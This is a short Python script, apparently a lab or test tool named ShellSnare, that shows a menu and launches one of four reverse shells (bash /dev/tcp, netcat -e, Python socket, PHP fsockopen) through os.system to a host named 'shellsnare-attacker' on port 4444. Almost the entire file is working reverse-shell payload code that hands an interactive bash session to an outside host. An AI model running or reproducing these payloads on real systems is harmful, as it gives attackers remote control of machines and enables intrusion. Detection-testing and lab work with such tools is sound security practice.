import os
import sys

ATTACKER_IP = "shellsnare-attacker"
PORT = "4444"

def print_menu():
    print("=========================================")
    print("      🪤  ShellSnare - Shell Launcher     ")
    print("=========================================")
    print("1. Bash TCP Reverse Shell (Easy)")
    print("2. Netcat Reverse Shell (Easy)")
    print("3. Python Reverse Shell (Medium)")
    print("4. PHP Reverse Shell (Medium)")
    print("0. Exit")
    print("=========================================")

def launch_bash():
    print(f"[*] Launching Bash TCP shell to {ATTACKER_IP}:{PORT}")
    payload = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1'"
    os.system(payload)

def launch_netcat():
    print(f"[*] Launching Netcat shell to {ATTACKER_IP}:{PORT}")
    payload = f"nc -e /bin/bash {ATTACKER_IP} {PORT}"
    os.system(payload)

def launch_python():
    print(f"[*] Launching Python shell to {ATTACKER_IP}:{PORT}")
    payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
    os.system(payload)

def launch_php():
    print(f"[*] Launching PHP shell to {ATTACKER_IP}:{PORT}")
    payload = f"""php -r '$sock=fsockopen("{ATTACKER_IP}",{PORT});exec("/bin/bash -i <&3 >&3 2>&3");'"""
    os.system(payload)

if __name__ == "__main__":
    while True:
        print_menu()
        try:
            choice = input("Select shell type: ")
            if choice == "1":
                launch_bash()
            elif choice == "2":
                launch_netcat()
            elif choice == "3":
                launch_python()
            elif choice == "4":
                launch_php()
            elif choice == "0":
                print("Exiting...")
                sys.exit(0)
            else:
                print("Invalid choice!")
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(0)
